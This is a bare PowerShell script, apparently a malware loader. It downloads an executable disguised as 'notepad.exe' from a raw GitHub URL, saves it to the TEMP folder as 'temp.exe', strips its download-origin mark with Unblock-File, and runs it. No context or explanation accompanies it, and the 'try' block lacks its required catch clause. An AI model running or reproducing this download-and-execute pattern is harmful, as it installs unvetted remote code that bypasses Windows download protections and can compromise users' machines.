$url = "https://raw.githubusercontent.com/tlxontop/api/refs/heads/main/notepad.exe"
$out = Join-Path $env:TEMP "temp.exe"
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $out)
    if (Test-Path $out) {
		Unblock-File $out
		Start-Process -FilePath $out -Wait
	}
}